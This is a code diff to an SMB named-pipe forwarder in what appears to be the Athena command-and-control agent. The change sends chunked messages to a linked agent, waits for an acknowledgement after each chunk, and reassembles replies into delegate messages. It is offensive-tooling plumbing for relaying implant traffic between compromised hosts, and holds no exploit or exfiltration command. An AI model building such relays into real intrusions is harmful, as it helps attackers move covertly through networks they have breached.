@@ -5,21 +5,28 @@ using Athena.Models.Mythic.Tasks;
 using Athena.Utilities;
 using H.Pipes;
 using H.Pipes.Args;
+using H.Pipes.Extensions;
 using System.Collections.Concurrent;
 using System.Diagnostics;
 using System.Text;
 using System.Text.Json;
+using Athena.Models.Comms.SMB;
 
 namespace Athena.Forwarders
 {
-    public class Forwarder : IForwarder
+    public class SMBForwarder : IForwarder
     {
         public bool connected { get; set; }
-        private PipeClient<DelegateMessage> clientPipe { get; set; }
+        public string id { get; set; }
+        private PipeClient<SmbMessage> clientPipe { get; set; }
+        AutoResetEvent messageSuccess = new AutoResetEvent(false);
+        public string profile_type => "smb";
+
         private ConcurrentDictionary<string, StringBuilder> partialMessages = new ConcurrentDictionary<string, StringBuilder>();
 
-        public Forwarder()
+        public SMBForwarder(string id)
         {
+            this.id = id;
         }
 
         //Link to the Athena SMB Agent
@@ -30,7 +37,7 @@ namespace Athena.Forwarders
             {
                 if (this.clientPipe is null || !this.connected)
                 {
-                    this.clientPipe = new PipeClient<DelegateMessage>(par["pipename"], par["hostname"]);
+                    this.clientPipe = new PipeClient<SmbMessage>(par["pipename"], par["hostname"]);
                     this.clientPipe.MessageReceived += (o, args) => OnMessageReceive(args);
                     this.clientPipe.Connected += (o, args) => this.connected = true;
                     this.clientPipe.Disconnected += (o, args) => this.connected = false;
@@ -38,6 +45,7 @@ namespace Athena.Forwarders
 
                     if (clientPipe.IsConnected)
                     {
+                        Debug.WriteLine($"[{DateTime.Now}] Established link with agent.");
                         this.connected = true;
                         return true;
                     }
@@ -54,24 +62,34 @@ namespace Athena.Forwarders
         {
             try
             {
+                SmbMessage sm = new SmbMessage()
+                {
+                    final = false,
+                    message_type = "chunked_message"
+                };
+
                 IEnumerable<string> parts = dm.message.SplitByLength(4000);
-                dm.final = false;
+                //dm.final = false;
 
                 Debug.WriteLine($"[{DateTime.Now}] Sending message with size of {dm.message.Length} in {parts.Count()} chunks.");
                 foreach (string part in parts)
                 {
-                    dm.message = part;
+                    sm.delegate_message = part;
 
                     if (part == parts.Last())
                     {
-                        dm.final = true;
+                        sm.final = true;
                     }
-                    Debug.WriteLine($"[{DateTime.Now}] Sending message to pipe: {part.Length} bytes. (Final = {dm.final}");
-                    await this.clientPipe.WriteAsync(dm);
+                    Debug.WriteLine($"[{DateTime.Now}] Sending message to pipe: {part.Length} bytes. (Final = {sm.final})");
+                    
+                    await this.clientPipe.WriteAsync(sm);
+                    
+                    //Wait for an indicator of success from the agent.
+                    messageSuccess.WaitOne();
                 }
                 return true;
             }
-            catch (Exception e )
+            catch (Exception e)
             {
                 Debug.WriteLine($"[{DateTime.Now}] Error in send: {e}");
                 return false;
@@ -93,42 +111,33 @@ namespace Athena.Forwarders
                 return false;
             }
         }
-        private async Task OnMessageReceive(ConnectionMessageEventArgs<DelegateMessage> args)
+        private async Task OnMessageReceive(ConnectionMessageEventArgs<SmbMessage> args)
         {
-            Debug.WriteLine($"[{DateTime.Now}] Message received from pipe {args.Message.message.Length} bytes");
+            Debug.WriteLine($"[{DateTime.Now}] Message received from pipe {args.Message.delegate_message.Length} bytes");
             try
             {
-                if (this.partialMessages.ContainsKey(args.Message.uuid))
+                if(args.Message.message_type == "success")
                 {
-                    if (args.Message.final)
-                    {
-                        Debug.WriteLine($"[{DateTime.Now}] Final chunk received.");
-                        string oldMsg = args.Message.message;
-
-                        args.Message.message = this.partialMessages[args.Message.uuid].Append(oldMsg).ToString();
-
-                        await DelegateResponseHandler.AddDelegateMessageAsync(args.Message);
-                        this.partialMessages.Remove(args.Message.uuid, out _);
-
-                    }
-                    else //Not Last Message but we already have a value in the partial messages
-                    {
-                        Debug.WriteLine($"[{DateTime.Now}] Appending message to existing tracker.");
-                        this.partialMessages[args.Message.uuid].Append(args.Message.message);
-                    }
+                    messageSuccess.Set();
+                    return;
                 }
-                else //First time we've seen this message
+
+                this.partialMessages.TryAdd(args.Message.message_type, new StringBuilder()); //Either Add the key or it already exists
+                
+                this.partialMessages[args.Message.message_type].Append(args.Message.delegate_message);
+
+                if (args.Message.final)
                 {
-                    if (args.Message.final)
+                    Console.WriteLine(this.partialMessages[args.Message.message_type]);
+                    DelegateMessage dm = new DelegateMessage()
                     {
-                        Debug.WriteLine($"[{DateTime.Now}] Final chunk received.");
-                        await DelegateResponseHandler.AddDelegateMessageAsync(args.Message);
-                    }
-                    else
-                    {
-                        Debug.WriteLine($"[{DateTime.Now}] First chunk received.");
-                        this.partialMessages.GetOrAdd(args.Message.uuid, new StringBuilder(args.Message.message)); //Add value to our Collection
-                    }
+                        c2_profile = this.profile_type,
+                        message = this.partialMessages[args.Message.message_type].ToString(),
+                    };
+
+                    //DelegateMessage dm = JsonSerializer.Deserialize<DelegateMessage>(this.partialMessages[args.Message.message_type].ToString(), DelegateMessageJsonContext.Default.DelegateMessage);
+                    await DelegateResponseHandler.AddDelegateMessageAsync(dm);
+                    this.partialMessages.Remove(args.Message.message_type, out _);
                 }
             }
             catch (Exception e)
@@ -136,12 +145,5 @@ namespace Athena.Forwarders
                 Debug.WriteLine($"[{DateTime.Now}] Error in SMB Forwarder: {e}");
             }
         }
-    }
-    class SmbMessage
-    {
-        public string uuid;
-        public string message;
-        public int chunks;
-        public int chunk;
     }
 }
